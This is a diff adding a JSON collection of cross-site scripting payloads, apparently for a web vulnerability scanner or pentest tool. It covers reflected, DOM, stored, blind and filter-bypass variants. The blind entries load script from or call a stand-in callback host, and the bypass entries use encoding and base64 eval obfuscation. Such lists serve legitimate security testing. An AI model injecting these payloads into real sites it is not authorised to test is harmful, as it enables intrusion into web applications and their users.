@@ -1,0 +1,46 @@
+{
+  "reflected": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "'><script>alert('XSS')</script>",
+    "<body onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<iframe src=javascript:alert('XSS')>",
+    "<input autofocus onfocus=alert('XSS')>",
+    "<video><source onerror=alert('XSS')>",
+    "<audio src=x onerror=alert('XSS')>",
+    "<details open ontoggle=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>"
+  ],
+  "dom": [
+    "#<script>alert('XSS')</script>",
+    "#<img src=x onerror=alert('XSS')>",
+    "#<svg onload=alert('XSS')>",
+    "?q=<script>alert('XSS')</script>",
+    "?search=<img src=x onerror=alert('XSS')>"
+  ],
+  "stored": [
+    "<script>alert('STORED_XSS')</script>",
+    "<img src=x onerror=alert('STORED')>",
+    "<svg/onload=alert('STORED')>",
+    "'><img src=x onerror=alert('STORED')>"
+  ],
+  "blind": [
+    "<script src=https://your-callback.com/blind></script>",
+    "<img src=x onerror=fetch('https://your-callback.com/blind')>",
+    "<svg onload=fetch('https://your-callback.com/blind')>"
+  ],
+  "bypass": [
+    "<ScRiPt>alert('XSS')</ScRiPt>",
+    "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+    "<script>alert`XSS`</script>",
+    "';alert('XSS');//",
+    "\";alert('XSS');//",
+    "</script><script>alert('XSS')</script>",
+    "<svg><script>alert('XSS')</script>",
+    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+    "<<script>alert('XSS');//<</script>"
+  ]
+}
